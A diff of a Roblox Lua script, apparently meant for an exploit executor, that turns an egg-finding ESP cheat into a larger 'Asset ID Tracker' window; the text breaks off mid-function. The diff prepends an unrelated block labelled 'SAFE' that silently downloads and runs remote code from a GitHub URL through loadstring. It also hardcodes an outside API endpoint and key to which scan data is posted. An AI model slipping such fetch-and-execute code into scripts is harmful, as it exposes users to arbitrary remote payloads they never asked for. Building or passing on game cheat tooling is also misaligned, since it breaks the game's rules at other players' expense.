@@ -1,262 +1,996 @@
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
+-- ============================================================================
+--  Anime League auto-load (SAFE — cannot break the tracker below)
+-- ============================================================================
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet(
+			"https://raw.githubusercontent.com/iccyzsn/anime_league/refs/heads/main/anime_league.lua"
+		))()
+	end)
+end)
 
--- ==========================================
--- EGG DATABASE (PUT YOUR MESH IDs HERE)
--- ==========================================
-local trackedEggs = {
-    ["PUT_AURORA_ID_HERE"] = {DisplayName = "Aurora Egg", Price = "300,000,000", Rarity = "Divine", Color = Color3.fromRGB(0, 255, 255)},
-    ["PUT_GALAXY_ID_HERE"] = {DisplayName = "Galaxy Egg", Price = "1,500,000,000", Rarity = "Divine", Color = Color3.fromRGB(180, 100, 255)},
-    ["PUT_BLACKHOLE_ID_HERE"] = {DisplayName = "Black Hole Egg", Price = "100,000,000,000", Rarity = "Ethereal", Color = Color3.fromRGB(80, 80, 80)},
-    ["PUT_CHERUB_ID_HERE"] = {DisplayName = "Cherub Egg", Price = "1,000,000,000,000", Rarity = "Ethereal", Color = Color3.fromRGB(255, 255, 100)}
+-- ============================================================================
+--  ASSET ID TRACKER  •  v2.3
+-- ============================================================================
+local Players          = game:GetService("Players")
+local StarterGui       = game:GetService("StarterGui")
+local Workspace        = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local HttpService      = game:GetService("HttpService")
+local Debris           = game:GetService("Debris")
+
+local LP = Players.LocalPlayer
+
+local CONFIG = {
+	MaxEntries          = 200,
+	ScanDelay           = 0.08,
+	HighlightDuration   = 6,
+	HighlightColor      = Color3.fromRGB(0, 255, 150),
+	IgnoreOwnCharacter  = true,
+	PrintToConsole      = true,
+	AutoHighlight       = true,
+	NotifyEnabled       = true,
+	NotifyPerIdCooldown = 12,
+	NotifyMinGap        = 1.5,
+	NotifyMaxPerSpawn   = 4,
+	StartHidden         = true,
+	ToggleKey           = Enum.KeyCode.RightShift,
 }
 
-local excludePaths = {"Plots", "Ranch"} -- Ignores eggs inside pens
-local activeEggs = {} 
+local API = {
+	Url     = "https://gowkxvflerlpnhzvluwk.supabase.co/functions/v1/rapid-processor",
+	Key     = "sb_publishable_9OIUDI3bofUTXlexRtHb7w_dDbkskCQ",
+	Channel = "egg",
+}
 
--- ==========================================
--- 1. CREATE THE GUI PANEL
--- ==========================================
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "EggTrackerGui"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = player:WaitForChild("PlayerGui")
+local THEME = {
+	Bg       = Color3.fromRGB(15, 17, 23),
+	Panel    = Color3.fromRGB(24, 27, 36),
+	PanelAlt = Color3.fromRGB(32, 36, 47),
+	Hover    = Color3.fromRGB(42, 47, 62),
+	Stroke   = Color3.fromRGB(48, 54, 70),
+	Text     = Color3.fromRGB(233, 237, 245),
+	SubText  = Color3.fromRGB(138, 147, 168),
+	Accent   = Color3.fromRGB(88, 166, 255),
+	Good     = Color3.fromRGB(0, 220, 160),
+	Danger   = Color3.fromRGB(255, 92, 92),
+	Warn     = Color3.fromRGB(255, 190, 80),
+}
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 250, 0, 210)
-mainFrame.Position = UDim2.new(0, 15, 0.5, -105)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 30, 25)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
+local FONT       = Enum.Font.Gotham
+local FONT_BOLD  = Enum.Font.GothamBold
+local FONT_BLACK = Enum.Font.GothamBlack
+local FONT_MONO  = Enum.Font.Code
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 30)
-title.BackgroundColor3 = Color3.fromRGB(10, 20, 15)
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.Text = "🥚 Egg Tracker (Mesh ID)"
-title.Font = Enum.Font.GothamBold
-title.TextSize = 14
-title.Parent = mainFrame
-
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, -10, 1, -40)
-scrollFrame.Position = UDim2.new(0, 5, 0, 35)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.ScrollBarThickness = 4
-scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-scrollFrame.Parent = mainFrame
-
-local uiLayout = Instance.new("UIListLayout")
-uiLayout.Padding = UDim.new(0, 5)
-uiLayout.Parent = scrollFrame
-
-local eggUI = {}
-
-for meshId, data in pairs(trackedEggs) do
-    local row = Instance.new("Frame")
-    row.Size = UDim2.new(1, -5, 0, 50)
-    row.BackgroundColor3 = Color3.fromRGB(30, 40, 35)
-    row.Parent = scrollFrame
-    
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -10, 0, 20)
-    nameLabel.Position = UDim2.new(0, 5, 0, 2)
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Text = data.DisplayName
-    nameLabel.TextColor3 = data.Color
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextSize = 13
-    nameLabel.Parent = row
-    
-    local infoLabel = Instance.new("TextLabel")
-    infoLabel.Size = UDim2.new(0.6, 0, 0, 20)
-    infoLabel.Position = UDim2.new(0, 5, 0, 25)
-    infoLabel.BackgroundTransparency = 1
-    infoLabel.Text = data.Price .. " | " .. data.Rarity
-    infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
-    infoLabel.Font = Enum.Font.Code
-    infoLabel.TextSize = 11
-    infoLabel.Parent = row
-    
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0.4, -5, 0, 20)
-    statusLabel.Position = UDim2.new(0.6, 0, 0, 25)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "Unavailable"
-    statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-    statusLabel.TextXAlignment = Enum.TextXAlignment.Right
-    statusLabel.Font = Enum.Font.GothamBold
-    statusLabel.TextSize = 11
-    statusLabel.Parent = row
-    
-    eggUI[data.DisplayName] = {Row = row, Status = statusLabel}
+local function create(className, props, parent)
+	local inst = Instance.new(className)
+	for k, v in pairs(props or {}) do inst[k] = v end
+	if parent then inst.Parent = parent end
+	return inst
+end
+local function corner(r, p) return create("UICorner", { CornerRadius = UDim.new(0, r) }, p) end
+local function stroke(c, t, tr, p)
+	return create("UIStroke", { Color = c, Thickness = t or 1, Transparency = tr or 0,
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, p)
+end
+local function addHover(btn, base, hover)
+	btn.BackgroundColor3 = base
+	btn:SetAttribute("BaseColor", base)
+	btn.MouseEnter:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = hover }):Play()
+	end)
+	btn.MouseLeave:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = btn:GetAttribute("BaseColor") }):Play()
+	end)
+end
+local function setButtonColor(btn, color)
+	btn:SetAttribute("BaseColor", color)
+	TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = color }):Play()
 end
 
--- ==========================================
--- 2. ESP & ZIPLINE LOGIC
--- ==========================================
-local function extractId(str)
-    if not str or str == "" then return nil end
-    return str:match("%d+")
+local function resolveGuiParent()
+	if typeof(gethui) == "function" then
+		local ok, hui = pcall(gethui)
+		if ok and hui then return hui end
+	end
+	local ok, cg = pcall(function() return game:GetService("CoreGui") end)
+	if ok and cg then
+		local t = Instance.new("Folder")
+		local ok2 = pcall(function() t.Parent = cg end)
+		t:Destroy()
+		if ok2 then return cg end
+	end
+	return LP:WaitForChild("PlayerGui")
 end
 
-local function getAdornee(obj)
-    if obj:IsA("BasePart") then return obj end
-    if obj:IsA("Model") then
-        if obj.PrimaryPart then return obj.PrimaryPart end
-        return obj:FindFirstChildWhichIsA("BasePart", true)
-    end
-    return nil
-end
+local screen = create("ScreenGui", {
+	Name = "AssetTrackerUI", ResetOnSpawn = false, IgnoreGuiInset = true,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 9999,
+}, resolveGuiParent())
 
-local function setupZipline(egg, displayName)
-    if egg:GetAttribute("ZiplineActive") then return end
-    local adornee = getAdornee(egg)
-    if not adornee then return end
+-- ============================================================================
+--  FLOATING TOGGLE BUBBLE (always visible)
+-- ============================================================================
+local toggleBtn = create("TextButton", {
+	Name = "ToggleBtn",
+	Position = UDim2.new(0, 24, 0, 120),
+	Size = UDim2.fromOffset(52, 52),
+	BackgroundColor3 = THEME.Panel,
+	BorderSizePixel = 0, AutoButtonColor = false,
+	Font = FONT, Text = "🔍", TextSize = 22,
+	TextColor3 = THEME.Text, ZIndex = 20,
+}, screen)
+corner(26, toggleBtn)
+local toggleStroke = stroke(THEME.Stroke, 2, 0, toggleBtn)
 
-    local espColor = trackedEggs[displayName] and trackedEggs[displayName].Color or Color3.new(1,1,1)
-    -- Fix: If tracked by ID, we get color from the data
-    for _, data in pairs(trackedEggs) do
-        if data.DisplayName == displayName then
-            espColor = data.Color
-            break
-        end
-    end
+local pulse = create("Frame", {
+	AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+	Size = UDim2.fromOffset(52, 52), BackgroundTransparency = 1,
+	BorderSizePixel = 0, ZIndex = 0,
+}, toggleBtn)
+corner(26, pulse)
+local pulseStroke = stroke(THEME.Accent, 2, 0.4, pulse)
 
-    egg:SetAttribute("ZiplineActive", true)
+toggleBtn.MouseEnter:Connect(function()
+	TweenService:Create(toggleBtn, TweenInfo.new(0.12), { BackgroundColor3 = THEME.Hover }):Play()
+	TweenService:Create(toggleStroke, TweenInfo.new(0.12), { Color = THEME.Accent }):Play()
+end)
+toggleBtn.MouseLeave:Connect(function()
+	TweenService:Create(toggleBtn, TweenInfo.new(0.12), { BackgroundColor3 = THEME.Panel }):Play()
+	TweenService:Create(toggleStroke, TweenInfo.new(0.12), { Color = THEME.Stroke }):Play()
+end)
 
-    local highlight = Instance.new("Highlight")
-    highlight.Name = "TrackerHighlight"
-    highlight.FillColor = espColor
-    highlight.OutlineColor = Color3.new(1, 1, 1)
-    highlight.FillTransparency = 0.3
-    highlight.Parent = egg
-
-    local eggAtt = Instance.new("Attachment")
-    eggAtt.Name = "EggZiplineAtt"
-    eggAtt.Parent = adornee
-
-    local beam = Instance.new("Beam")
-    beam.Name = "ZiplineBeam"
-    beam.Attachment1 = eggAtt
-    beam.Color = ColorSequence.new(espColor)
-    beam.Width0 = 0.15
-    beam.Width1 = 0.15
-    beam.FaceCamera = true
-    beam.Transparency = NumberSequence.new(0.2)
-    beam.Parent = adornee
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "TrackerTag"
-    billboard.Size = UDim2.new(0, 150, 0, 30)
-    billboard.StudsOffset = Vector3.new(0, 3, 0)
-    billboard.AlwaysOnTop = true
-    billboard.Adornee = adornee
-    billboard.Parent = egg
-
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, 0, 1, 0)
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Text = displayName
-    nameLabel.TextColor3 = Color3.new(1, 1, 1)
-    nameLabel.TextStrokeTransparency = 0
-    nameLabel.TextScaled = true
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.Parent = billboard
-
-    activeEggs[egg] = beam
-end
-
--- New function to check Mesh IDs
-local function checkEggByMesh(obj)
-    if not (obj:IsA("BasePart") or obj:IsA("Model")) then return nil end
-    
-    local path = obj:GetFullName()
-    for _, exclude in ipairs(excludePaths) do
-        if string.find(path, exclude) then return nil end
-    end
-    
-    -- Get the MeshPart ID
-    if obj:IsA("MeshPart") then
-        local meshId = extractId(obj.MeshId)
-        if meshId and trackedEggs[meshId] then
-            return trackedEggs[meshId].DisplayName
-        end
-    end
-    
-    -- Get the SpecialMesh ID if it's inside the object
-    local specialMesh = obj:FindFirstChildWhichIsA("SpecialMesh", true)
-    if specialMesh then
-        local meshId = extractId(specialMesh.MeshId)
-        if meshId and trackedEggs[meshId] then
-            return trackedEggs[meshId].DisplayName
-        end
-    end
-    
-    return nil
-end
-
--- ==========================================
--- 3. BACKGROUND TRACKER & ZIPLINE RENDERER
--- ==========================================
 task.spawn(function()
-    while task.wait(1) do
-        local foundEggs = {}
-        
-        for _, obj in ipairs(Workspace:GetDescendants()) do
-            local displayName = checkEggByMesh(obj)
-            if displayName then
-                foundEggs[displayName] = true
-                setupZipline(obj, displayName)
-            end
-        end
-        
-        for displayName, ui in pairs(eggUI) do
-            if foundEggs[displayName] then
-                ui.Status.Text = "AVAILABLE"
-                ui.Status.TextColor3 = Color3.fromRGB(0, 255, 0)
-                ui.Row.BackgroundColor3 = Color3.fromRGB(40, 80, 50)
-            else
-                ui.Status.Text = "Unavailable"
-                ui.Status.TextColor3 = Color3.fromRGB(255, 50, 50)
-                ui.Row.BackgroundColor3 = Color3.fromRGB(30, 40, 35)
-            end
-        end
-
-        for egg, _ in pairs(activeEggs) do
-            if not egg or not egg.Parent then
-                activeEggs[egg] = nil
-            end
-        end
-    end
+	while pulse and pulse.Parent do
+		pulse.Size = UDim2.fromOffset(52, 52)
+		pulseStroke.Transparency = 0.5
+		TweenService:Create(pulse, TweenInfo.new(1.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Size = UDim2.fromOffset(84, 84),
+		}):Play()
+		TweenService:Create(pulseStroke, TweenInfo.new(1.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Transparency = 1,
+		}):Play()
+		task.wait(1.6)
+	end
 end)
 
-RunService.RenderStepped:Connect(function()
-    local char = player.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    
-    if hrp then
-        if not hrp:FindFirstChild("PlayerZiplineAtt") then
-            local att = Instance.new("Attachment")
-            att.Name = "PlayerZiplineAtt"
-            att.Parent = hrp
-        end
-        
-        local playerAtt = hrp:FindFirstChild("PlayerZiplineAtt")
-        
-        for egg, beam in pairs(activeEggs) do
-            if egg and egg.Parent and beam and beam.Parent then
-                beam.Attachment0 = playerAtt
-            else
-                activeEggs[egg] = nil
-            end
-        end
-    end
+-- ============================================================================
+--  MAIN WINDOW
+-- ============================================================================
+local WINDOW_W, WINDOW_H = 500, 500
+local main = create("Frame", {
+	Name = "Window",
+	Position = UDim2.fromOffset(90, 80),
+	Size = UDim2.fromOffset(WINDOW_W, WINDOW_H),
+	BackgroundColor3 = THEME.Bg, BorderSizePixel = 0,
+	ClipsDescendants = true, Visible = false,
+}, screen)
+corner(12, main)
+stroke(THEME.Stroke, 1, 0, main)
+
+-- Header
+local header = create("Frame", {
+	Size = UDim2.new(1, 0, 0, 46),
+	BackgroundColor3 = THEME.Panel, BorderSizePixel = 0,
+}, main)
+create("Frame", {
+	Position = UDim2.new(0, 0, 1, -1), Size = UDim2.new(1, 0, 0, 1),
+	BackgroundColor3 = THEME.Accent, BackgroundTransparency = 0.55, BorderSizePixel = 0,
+}, header)
+
+local logoBox = create("Frame", {
+	Position = UDim2.fromOffset(12, 10), Size = UDim2.fromOffset(26, 26),
+	BackgroundColor3 = THEME.Accent, BorderSizePixel = 0,
+}, header)
+corner(8, logoBox)
+create("TextLabel", {
+	Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
+	Font = FONT, Text = "🔍", TextSize = 15,
+	TextColor3 = Color3.fromRGB(255, 255, 255),
+}, logoBox)
+
+create("TextLabel", {
+	Position = UDim2.fromOffset(48, 9), Size = UDim2.new(1, -160, 0, 15),
+	BackgroundTransparency = 1, Font = FONT_BLACK, Text = "ASSET ID TRACKER",
+	TextSize = 14, TextColor3 = THEME.Text,
+	TextXAlignment = Enum.TextXAlignment.Left,
+}, header)
+create("TextLabel", {
+	Position = UDim2.fromOffset(48, 25), Size = UDim2.new(1, -160, 0, 14),
+	BackgroundTransparency = 1, Font = FONT,
+	Text = "Live Workspace monitor  •  v2.3",
+	TextSize = 11, TextColor3 = THEME.SubText,
+	TextXAlignment = Enum.TextXAlignment.Left,
+}, header)
+
+local function headerButton(text, x, color)
+	local b = create("TextButton", {
+		AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, x, 0, 23),
+		Size = UDim2.fromOffset(28, 28), BackgroundColor3 = THEME.PanelAlt,
+		BorderSizePixel = 0, AutoButtonColor = false,
+		Font = FONT_BOLD, Text = text, TextSize = 14,
+		TextColor3 = color or THEME.SubText,
+	}, header)
+	corner(8, b); addHover(b, THEME.PanelAlt, THEME.Hover)
+	return b
+end
+local minimizeBtn = headerButton("—", -12, THEME.Text)
+local closeBtn    = headerButton("✕", -46, THEME.Danger)
+
+-- Toolbar
+local toolbar = create("Frame", {
+	Position = UDim2.new(0, 0, 0, 46), Size = UDim2.new(1, 0, 0, 42),
+	BackgroundTransparency = 1,
+}, main)
+
+local searchBox = create("TextBox", {
+	Position = UDim2.fromOffset(10, 9), Size = UDim2.new(1, -230, 0, 26),
+	BackgroundColor3 = THEME.Panel, BorderSizePixel = 0, Font = FONT,
+	Text = "", PlaceholderText = "🔎  Search name, ID, class, path...",
+	PlaceholderColor3 = THEME.SubText, TextColor3 = THEME.Text, TextSize = 12,
+	TextXAlignment = Enum.TextXAlignment.Left, ClearTextOnFocus = false,
+}, toolbar)
+corner(7, searchBox)
+local searchStroke = stroke(THEME.Stroke, 1, 0.3, searchBox)
+create("UIPadding", { PaddingLeft = UDim.new(0, 9), PaddingRight = UDim.new(0, 9) }, searchBox)
+searchBox.Focused:Connect(function()
+	TweenService:Create(searchStroke, TweenInfo.new(0.15), { Color = THEME.Accent, Transparency = 0 }):Play()
+end)
+searchBox.FocusLost:Connect(function()
+	TweenService:Create(searchStroke, TweenInfo.new(0.15), { Color = THEME.Stroke, Transparency = 0.3 }):Play()
 end)
 
-print("Mesh ID Egg Zipline Tracker Loaded!")
+local function toolButton(text, x, base, tc)
+	local b = create("TextButton", {
+		AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, x, 0, 22),
+		Size = UDim2.fromOffset(32, 26), BackgroundColor3 = base,
+		BorderSizePixel = 0, AutoButtonColor = false,
+		Font = FONT, Text = text, TextSize = 14,
+		TextColor3 = tc or THEME.Text,
+	}, toolbar)
+	corner(7, b)
+	b:SetAttribute("BaseColor", base)
+	b.MouseEnter:Connect(function()
+		TweenService:Create(b, TweenInfo.new(0.12), {
+			BackgroundColor3 = (b:GetAttribute("BaseColor")):Lerp(Color3.new(1,1,1), 0.1),
+		}):Play()
+	end)
+	b.MouseLeave:Connect(function()
+		TweenService:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = b:GetAttribute("BaseColor") }):Play()
+	end)
+	return b
+end
+
+local clearBtn     = toolButton("🗑", -10,  THEME.Panel)
+local pauseBtn     = toolButton("⏸", -48,  THEME.Panel)
+local notifyBtn    = toolButton("🔔", -86,  THEME.Panel)
+local highlightBtn = toolButton("🎯", -124, THEME.Panel)
+local sendBtn      = toolButton("📤", -162, THEME.PanelAlt, THEME.SubText)
+
+local statsBar = create("Frame", {
+	Position = UDim2.new(0, 0, 0, 88), Size = UDim2.new(1, 0, 0, 20),
+	BackgroundTransparency = 1,
+}, main)
+local statsLabel = create("TextLabel", {
+	Position = UDim2.fromOffset(14, 0), Size = UDim2.new(1, -28, 1, 0),
+	BackgroundTransparency = 1, Font = FONT,
+	Text = "Found: 0   •   Shown: 0   •   Selected: none",
+	TextSize = 11, TextColor3 = THEME.SubText,
+	TextXAlignment = Enum.TextXAlignment.Left,
+}, statsBar)
+
+local logFrame = create("ScrollingFrame", {
+	Position = UDim2.fromOffset(8, 110), Size = UDim2.new(1, -16, 1, -142),
+	BackgroundTransparency = 1, BorderSizePixel = 0,
+	ScrollBarThickness = 4, ScrollBarImageColor3 = THEME.Stroke,
+	ScrollBarImageTransparency = 0.3, CanvasSize = UDim2.new(),
+	AutomaticCanvasSize = Enum.AutomaticSize.Y,
+	ScrollingDirection = Enum.ScrollingDirection.Y,
+}, main)
+create("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, logFrame)
+create("UIPadding", {
+	PaddingTop = UDim.new(0, 2), PaddingBottom = UDim.new(0, 8),
+	PaddingRight = UDim.new(0, 4),
+}, logFrame)
+
+local footer = create("Frame", {
+	Position = UDim2.new(0, 0, 1, -30), Size = UDim2.new(1, 0, 0, 30),
+	BackgroundColor3 = THEME.Panel, BorderSizePixel = 0,
+}, main)
+create("Frame", {
+	Position = UDim2.new(0, 0, 0, 0), Size = UDim2.new(1, 0, 0, 1),
+	BackgroundColor3 = THEME.Stroke, BorderSizePixel = 0,
+}, footer)
+local statusLabel = create("TextLabel", {
+	Position = UDim2.fromOffset(12, 0), Size = UDim2.new(0.5, 0, 1, 0),
+	BackgroundTransparency = 1, Font = FONT_BOLD, Text = "● TRACKING",
+	TextSize = 11, TextColor3 = THEME.Good,
+	TextXAlignment = Enum.TextXAlignment.Left,
+}, footer)
+create("TextLabel", {
+	AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -12, 0, 0),
+	Size = UDim2.new(0.6, 0, 1, 0), BackgroundTransparency = 1,
+	Font = FONT, Text = "RightShift = hide  •  Click row = select  •  📤 = send",
+	TextSize = 10, TextColor3 = THEME.SubText,
+	TextXAlignment = Enum.TextXAlignment.Right,
+}, footer)
+
+local function makeDraggable(frame, handle)
+	handle = handle or frame
+	local dragging, dragStart, startPos
+	handle.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true; dragStart = input.Position; startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then dragging = false end
+			end)
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if not dragging then return end
+		if input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch then
+			local d = input.Position - dragStart
+			frame.Position = UDim2.new(
+				startPos.X.Scale, startPos.X.Offset + d.X,
+				startPos.Y.Scale, startPos.Y.Offset + d.Y
+			)
+		end
+	end)
+end
+makeDraggable(main, header)
+makeDraggable(toggleBtn)
+
+-- ============================================================================
+--  ASSET EXTRACTION
+-- ============================================================================
+local function extractId(s)
+	if type(s) ~= "string" or s == "" then return nil end
+	local id = s:match("[%?&]id=(%d+)") or s:match("(%d+)")
+	if id and #id >= 3 then return id end
+	return nil
+end
+
+local ASSET_PROPS = {
+	MeshPart          = { "MeshId", "TextureID" },
+	SpecialMesh       = { "MeshId", "TextureId" },
+	CylinderMesh      = { "MeshId", "TextureId" },
+	BlockMesh         = { "MeshId" },
+	Decal             = { "Texture" },
+	Texture           = { "Texture" },
+	SurfaceAppearance = { "ColorMap", "NormalMap", "RoughnessMap", "MetalnessMap" },
+	ParticleEmitter   = { "Texture" },
+	Sound             = { "SoundId" },
+	Animation         = { "AnimationId" },
+	Tool              = { "TextureId" },
+	ImageLabel        = { "Image" },
+	ImageButton       = { "Image" },
+	Shirt             = { "ShirtTemplate" },
+	Pants             = { "PantsTemplate" },
+	ShirtGraphic      = { "Graphic" },
+	Sky               = { "SkyboxUp","SkyboxDn","SkyboxLf","SkyboxRt","SkyboxFt","SkyboxBk" },
+	Beam              = { "Texture" },
+	Trail             = { "Texture" },
+	Explosion         = { "Texture" },
+	Fire              = { "Texture" },
+	Sparkles          = { "Texture" },
+	CharacterMesh     = { "MeshId", "BaseTextureId", "OverlayTextureId" },
+}
+
+local PROP_INFO = {
+	MeshId = {"Mesh","🧊"}, TextureId = {"Texture","🖼️"}, TextureID = {"Texture","🖼️"},
+	Texture = {"Texture","🖼️"}, SoundId = {"Sound","🔊"}, AnimationId = {"Animation","🎞️"},
+	Image = {"Image","🖼️"}, ShirtTemplate = {"Shirt","👕"}, PantsTemplate = {"Pants","👖"},
+	Graphic = {"Graphic","🎨"}, ColorMap = {"ColorMap","🎨"}, NormalMap = {"NormalMap","🗺️"},
+	RoughnessMap = {"Roughness","🗺️"}, MetalnessMap = {"Metalness","🗺️"},
+	SkyboxUp = {"Skybox","🌌"}, SkyboxDn = {"Skybox","🌌"}, SkyboxLf = {"Skybox","🌌"},
+	SkyboxRt = {"Skybox","🌌"}, SkyboxFt = {"Skybox","🌌"}, SkyboxBk = {"Skybox","🌌"},
+	BaseTextureId = {"Texture","🖼️"}, OverlayTextureId = {"Texture","🖼️"},
+}
+local CLASS_INFO = {
+	ParticleEmitter = {"Particle","✨"}, Beam = {"Beam","💫"}, Trail = {"Trail","💫"},
+	Fire = {"Fire","🔥"}, Explosion = {"Explosion","💥"}, Decal = {"Decal","🏷️"},
+	Sky = {"Skybox","🌌"}, Sound = {"Sound","🔊"}, Animation = {"Animation","🎞️"},
+}
+local TYPE_COLORS = {
+	Mesh = Color3.fromRGB(110,190,255), Texture = Color3.fromRGB(255,170,90),
+	Decal = Color3.fromRGB(255,140,200), Sound = Color3.fromRGB(180,140,255),
+	Animation = Color3.fromRGB(120,255,190), Particle = Color3.fromRGB(255,230,120),
+	Image = Color3.fromRGB(255,170,90), Shirt = Color3.fromRGB(140,220,140),
+	Pants = Color3.fromRGB(140,180,240), Graphic = Color3.fromRGB(255,200,120),
+	Skybox = Color3.fromRGB(150,180,255), Beam = Color3.fromRGB(150,220,255),
+	Trail = Color3.fromRGB(150,220,255), Fire = Color3.fromRGB(255,130,80),
+	Explosion = Color3.fromRGB(255,110,90), ColorMap = Color3.fromRGB(255,160,120),
+	NormalMap = Color3.fromRGB(160,200,255), Roughness = Color3.fromRGB(190,190,190),
+	Metalness = Color3.fromRGB(200,200,220),
+}
+local function describe(className, prop)
+	local info = CLASS_INFO[className] or PROP_INFO[prop]
+	if info then return info[1], info[2], TYPE_COLORS[info[1]] or THEME.Accent end
+	return prop, "📦", THEME.Accent
+end
+
+local function highlightInstance(inst, dur)
+	if not inst or not inst.Parent then return end
+	if inst:FindFirstChild("AssetTrackerHighlight") then
+		inst.AssetTrackerHighlight:Destroy()
+	end
+	local h = create("Highlight", {
+		Name = "AssetTrackerHighlight",
+		FillColor = CONFIG.HighlightColor, FillTransparency = 0.65,
+		OutlineColor = Color3.fromRGB(255,255,255), OutlineTransparency = 0.15,
+		DepthMode = Enum.HighlightDepthMode.AlwaysOnTop,
+	}, inst)
+	Debris:AddItem(h, dur or CONFIG.HighlightDuration)
+end
+
+local function notify(title, text, dur)
+	if not CONFIG.NotifyEnabled then return end
+	pcall(function()
+		StarterGui:SetCore("SendNotification", {
+			Title = title, Text = text, Duration = dur or 4,
+		})
+	end)
+end
+
+local function copyText(text)
+	text = tostring(text)
+	if typeof(setclipboard) == "function" then
+		if pcall(setclipboard, text) then return true end
+	end
+	local tb = create("TextBox", {
+		Position = UDim2.fromOffset(-200,-200), Size = UDim2.fromOffset(2,2),
+		BackgroundTransparency = 1, TextTransparency = 1,
+		Text = text, TextSize = 1, ClearTextOnFocus = false,
+	}, screen)
+	tb:CaptureFocus()
+	tb.SelectionStart = 1
+	tb.CursorPosition = #tb.Text + 1
+	task.delay(0.6, function()
+		pcall(function() tb:ReleaseFocus() end); tb:Destroy()
+	end)
+	return true
+end
+
+local function postToApi(title, message)
+	local body = HttpService:JSONEncode({ title = title, message = message, channel = API.Channel })
+	local headers = {
+		["Authorization"] = "Bearer " .. API.Key,
+		["apikey"]        = API.Key,
+		["Content-Type"]  = "application/json",
+	}
+	if typeof(request) == "function" then
+		local ok, resp = pcall(request, {
+			Url = API.Url, Method = "POST", Headers = headers, Body = body,
+		})
+		if ok and resp then return resp.StatusCode == 200 or resp.Success == true, resp end
+		return false, resp
+	end
+	local ok, resp = pcall(function()
+		return HttpService:RequestAsync({
+			Url = API.Url, Method = "POST", Headers = headers, Body = body,
+		})
+	end)
+	if ok and resp then return resp.Success == true or resp.StatusCode == 200, resp end
+	return false, resp
+end
+
+-- ============================================================================
+--  FOLDERS
+-- ============================================================================
+local folders = {}
+local folderOrder = 0
+
+local function getOrCreateFolder(className)
+	if folders[className] then return folders[className] end
+	folderOrder += 1
+
+	local container = create("Frame", {
+		Name = className, Size = UDim2.new(1, 0, 0, 0),
+		AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1,
+		LayoutOrder = folderOrder,
+	}, logFrame)
+	create("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, container)
+
+	local hdr = create("TextButton", {
+		Name = "FolderHeader", Size = UDim2.new(1, 0, 0, 30),
+		BackgroundColor3 = THEME.PanelAlt, BorderSizePixel = 0,
+		AutoButtonColor = false, Text = "", LayoutOrder = 0,
+	}, container)
+	corner(8, hdr); stroke(THEME.Stroke, 1, 0.35, hdr)
+
+	local arrow = create("TextLabel", {
+		Position = UDim2.fromOffset(10, 0), Size = UDim2.fromOffset(14, 30),
+		BackgroundTransparency = 1, Font = FONT_BOLD, Text = "▼",
+		TextSize = 11, TextColor3 = THEME.SubText,
+		TextXAlignment = Enum.TextXAlignment.Left,
+	}, hdr)
+	local dot = create("Frame", {
+		Position = UDim2.fromOffset(28, 11), Size = UDim2.fromOffset(8, 8),
+		BackgroundColor3 = THEME.Accent, BorderSizePixel = 0,
+	}, hdr)
+	corner(4, dot)
+	local nameLabel = create("TextLabel", {
+		Position = UDim2.fromOffset(42, 0), Size = UDim2.new(1, -100, 1, 0),
+		BackgroundTransparency = 1, Font = FONT_BOLD, Text = className,
